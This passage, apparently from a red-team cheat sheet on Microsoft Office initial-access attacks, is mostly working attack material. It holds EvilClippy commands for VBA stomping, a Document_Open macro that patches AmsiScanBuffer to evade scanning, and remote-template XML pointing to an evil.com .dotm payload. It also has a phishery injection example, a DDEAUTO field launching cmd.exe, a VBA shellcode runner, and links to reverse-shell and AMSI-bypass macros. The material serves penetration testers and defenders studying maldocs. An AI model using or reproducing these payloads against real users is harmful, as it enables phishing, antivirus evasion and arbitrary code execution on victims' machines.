  \ is one of the best editors for this.\n\n```ps1\n# OSX/Linux\nmcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll\
  \ /out:EvilClippy.exe *.cs \n# Windows\ncsc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe\
  \ *.cs \n\nEvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc\nEvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc\n\
  EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc\n\n# make macro code unaccessible is to mark the project as locked\
  \ and unviewable: -u\n# Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.\nEvilClippy.exe\
  \ -r macrofile.doc\n```\n\n### VBA - Offensive Security Template\n\n* Reverse Shell VBA - [JohnWoodman/VBA-Macro-Reverse-Shell/VBA-Reverse-Shell.vba](https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba)\n\
  * Process Dumper - [JohnWoodman/VBA-Macro-Dump-Process](https://github.com/JohnWoodman/VBA-Macro-Dump-Process)\n* RunPE\
  \ - [itm4n/VBA-RunPE](https://github.com/itm4n/VBA-RunPE)\n* Spoof Parent - [py7hagoras/OfficeMacro64](https://github.com/py7hagoras/OfficeMacro64)\n\
  * AMSI Bypass - [outflanknl/AMSIbypasses.vba](https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba)\n* amsiByPassWithRTLMoveMemory\
  \ - [DanShaqFu/amsiByPassWithRTLMoveMemory.vba](https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3)\n* VBA\
  \ macro spawning a process with a spoofed parent - [christophetd/spoofing-office-macro/macro64.vba](https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba)\n\
  \n### VBA - AMSI\n\n> The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering\
  \ a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. [Office VBA + AMSI: Parting the veil\
  \ on malicious macros by Microsoft Security Team](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)\n\
  \n![runtime-scanning-amsi](https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png)\n\
  \n:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine\
  \ (e.g. files manipulated by our tool EvilClippy).\n\nThe AMSI engine only hooks into VBA, we can bypass it by using Excel\
  \ 4.0 Macro\n\n* AMSI Trigger - [synacktiv/AMSI-Bypass](https://github.com/synacktiv/AMSI-Bypass)\n\n```vb\nPrivate Declare\
  \ PtrSafe Function GetProcAddress Lib \"kernel32\" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr\nPrivate\
  \ Declare PtrSafe Function LoadLibrary Lib \"kernel32\" Alias \"LoadLibraryA\" (ByVal lpLibFileName As String) As LongPtr\n\
  Private Declare PtrSafe Function VirtualProtect Lib \"kernel32\" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect\
  \ As Long, lpflOldProtect As Long) As Long\nPrivate Declare PtrSafe Sub CopyMemory Lib \"kernel32\" Alias \"RtlMoveMemory\"\
  \ (Destination As Any, Source As Any, ByVal Length As LongPtr)\n \nPrivate Sub Document_Open()\n    Dim AmsiDLL As LongPtr\n\
  \    Dim AmsiScanBufferAddr As LongPtr\n    Dim result As Long\n    Dim MyByteArray(6) As Byte\n    Dim ArrayPointer As\
  \ LongPtr\n \n    MyByteArray(0) = 184 ' 0xB8\n    MyByteArray(1) = 87  ' 0x57\n    MyByteArray(2) = 0   ' 0x00\n    MyByteArray(3)\
  \ = 7   ' 0x07\n    MyByteArray(4) = 128 ' 0x80\n    MyByteArray(5) = 195 ' 0xC3\n \n    AmsiDLL = LoadLibrary(\"amsi.dll\"\
  )\n    AmsiScanBufferAddr = GetProcAddress(AmsiDLL, \"AmsiScanBuffer\")\n    result = VirtualProtect(ByVal AmsiScanBufferAddr,\
  \ 5, 64, 0)\n    ArrayPointer = VarPtr(MyByteArray(0))\n    CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6\n\
  \     \nEnd Sub\n```\n\n### DOCX - Template Injection\n\n:warning: Does not require \"Enable Macro\"\n\n#### Remote Template\n\
  \n1. A malicious macro is saved in a Word template .dotm file\n2. Benign .docx file is created based on one of the default\
  \ MS Word Document templates\n3. Document from step 2 is saved as .docx\n4. Document from step 3 is renamed to .zip\n5.\
  \ Document from step 4 gets unzipped\n6. **.\\word_rels\\settings.xml.rels** contains a reference to the template file.\
  \ That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server\
  \ (http) or webdav (smb).\n\n    ```xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>\n    <Relationships\
  \ xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\
  \ Target=\"file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx\"\
  \ TargetMode=\"External\"/></Relationships>\n    ```\n\n    ```xml\n    <?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"\
  yes\"?><Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\"><Relationship Id=\"rId1\" Type=\"\
  http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate\"\n    Target=\"https://evil.com/malicious.dotm\"\
  \ TargetMode=\"External\"/></Relationships>\n    ```\n\n7. File gets zipped back up again and renamed to .docx\n\n#### Template\
  \ Injections Tools\n\n* [JohnWoodman/remoteInjector](https://github.com/JohnWoodman/remoteInjector)\n* [ryhanson/phishery](https://github.com/ryhanson/phishery)\n\
  \n```ps1\n$ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx\n[+] Opening Word document: good.docx\n\
  [+] Setting Word document template to: https://secure.site.local/docs\n[+] Saving injected Word document to: bad.docx\n\
  [*] Injected Word document has been saved!\n```\n\n### DOCX - DDE\n\n* Insert > QuickPart > Field\n* Right Click > Toggle\
  \ Field Code\n* `{ DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" }`\n\n## Visual Studio Tools for Office\
  \ (VSTO)\n\nA VSTO file is a project file created with Visual Studio Tools for Office, a set of development tools provided\
  \ by Microsoft for building custom add-ins and solutions for Microsoft Office applications. These projects allow developers\
  \ to enhance the functionality of Office programs like Excel, Word, and Outlook by integrating additional features, automation,\
  \ and user interface customizations.\n\n* Visual Studio > `Word 2013 and 2016 VSTO Add-in`\n\n## Office Macro Development\n\
  \n### Execute WinAPI\n\nTo importe Win32 function we need to use the keyword `Private Declare`\n\n```vb\nPrivate Declare\
  \ Function <NAME> Lib \"<DLL_NAME>\" Alias \"<FUNCTION_IMPORTED>\" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>\n\
  ```\n\nIf we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`\nImporting\
  \ the `GetUserNameA` from `advapi32.dll`:\n\n```vb\nPrivate Declare PtrSafe Function GetUserName Lib \"advapi32.dll\" Alias\
  \ \"GetUserNameA\" (ByVal lpBuffer As String, ByRef nSize As Long) As Long\n```\n\n`GetUserNameA` prototype in C:\n\n```C\n\
  BOOL GetUserNameA(\n  LPSTR   lpBuffer,\n  LPDWORD pcbBuffer\n);\n```\n\n### Example with a simple Shellcode Runner\n\n\
  ```vb\nPrivate Declare PtrSafe Function VirtualAlloc Lib \"Kernel32.dll\" (ByVal lpAddress As Long, ByVal dwSize As Long,\
  \ ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr\nPrivate Declare PtrSafe Function RtlMoveMemory Lib\
  \ \"Kernel32.dll\" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr\nPrivate Declare\
  \ PtrSafe Function CreateThread Lib \"KERNEL32.dll\" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction\
  \ As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr\n\nSub WinAPI()\n\
  \    Dim buf As Variant\n    Dim addr As LongPtr\n    Dim counter As Long\n    Dim data As Long\n    buf = Array(252, ...)\n\
  \    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)\n    For counter = LBound(buf) To UBound(buf)\n        data = buf(counter)\n\
  \        res = RtlMoveMemory(addr + counter, data, 1)\n    Next counter\n    res = CreateThread(0, 0, addr, 0, 0, 0)\nEnd\
  \ Sub\n```\n\n## References\n\n* [AMSI in the heap - rmdavy](https://secureyourit.co.uk/wp/2020/04/17/amsi-in-the-heap/)\n\
  * [Analyzing VSTO Office Files - Didier Stevens - April 29, 2022](https://blog.nviso.eu/2022/04/29/analyzing-vsto-office-files/)\n\
  * [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)\n\
  * [Bypassing AMSI fro VBA - Outflank](https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/)\n* [Dechaining macros\
  \ and evading EDR - Noora Hyvärinen - 04/04/19](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)\n* [Evil Clippy\
  \ MS Office Maldoc Assistant - Outflank](https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/)\n\
  * [Excel 4 Macro Generator x86/x64 - bytecod3r](https://bytecod3r.io/excel-4-macro-generator-x86-x64/)\n* [Excel 4.0 Macro\
  \ Function Reference PDF](https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf)\n\
  * [Excel 4.0 macro old but new - fsx30](https://medium.com/@fsx30/excel-4-0-macro-old-but-new-967071106be9)\n* [Excel 4.0\
  \ Macros so hot right now - SneekyMonkey](https://www.sneakymonkey.net/2020/06/22/excel-4-0-macros-so-hot-right-now/)\n\
  * [Executing macros from docx with remote - RedXORBlue - July 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)\n\
  * [Further evasion in the forgotten corners of ms xls - malware.pizza](https://malware.pizza/2020/06/19/further-evasion-in-the-forgotten-corners-of-ms-xls/)\n\
  * [Inject macro from a remote dotm template - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros)\n\
  * [Macros and more with sharpshooter v2.0 - mdsec](https://www.mdsec.co.uk/2019/02/macros-and-more-with-sharpshooter-v2-0/)\n\
  * [Make phishing great again. VSTO office files are the new macro nightmare? - Daniel Schell - Apr 14, 2022](https://medium.com/@airlockdigital/make-phishing-great-again-vsto-office-files-are-the-new-macro-nightmare-e09fcadef010)\n\
  * [MS OFFICE FILE FORMAT SORCERY - TROOPERS19 - Pieter Ceelen & Stan Hegt - 21 March 2019](https://github.com/outflanknl/Presentations/blob/master/Troopers19_MS_Office_file_format_sorcery.pdf)\n\
  * [Office VBA AMSI Parting the veil on malicious macros - Microsoft](https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/)\n\
  * [Old schoold evil execl 4.0 macros XLM - Outflank](https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/)\n\
  * [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)\n\
  * [Phishing SLK - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-.slk-excel)bypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships)\n\
  * [Phishinh with OLE - ired.team](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/phishing-ole-+-lnk)\n\
  * [PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018](https://www.bitdam.com/2018/05/22/propertybomb-an-old-new-technique-for-arbitrary-code-execution-in-vba-macro/)\n\
  * [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)\n* [So\
  \ you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)\n\
  * [T1137.006 - Office Application Startup: Add-ins - redcanaryco](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.md)\n\
  * [VBA RunPE Part 1 - itm4n](https://itm4n.github.io/vba-runpe-part1/)\n* [VBA RunPE Part 2 - itm4n](https://itm4n.github.io/vba-runpe-part2/)\n\
  * [VBad - Pepitoh](https://github.com/Pepitoh/VBad)\n* [VenomousSway - VBA payload generation framework / Retired TrustedSec\
  \ Capabilities - Trustedsec - May 22, 2024](https://github.com/trustedsec/The_Shelf/tree/main/Retired/venomoussway)\n* [VSTO:\
  \ THE PAYLOAD INSTALLER THAT PROBABLY DEFEATS YOUR APPLICATION WHITELISTING RULES - BOHOPS - JANUARY 31, 2018](https://bohops.com/2018/01/31/vsto-the-payload-installer-that-probably-defeats-your-application-whitelisting-rules/)\n\
  * [Windows Defender Exploit Guard ASR Rules for Office - Carlos Perez - November 14, 2017](https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office)\n\
  * [WordAMSIBypass - rmdavy](https://github.com/rmdavy/WordAmsiBypass)\n* [XLS 4.0 macros and covenant - d-sec](https://d-sec.net/2020/10/24/xls-4-0-macros-and-covenant/)"
_relative_path: redteam/access/office-attacks.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/office-attacks.md
````
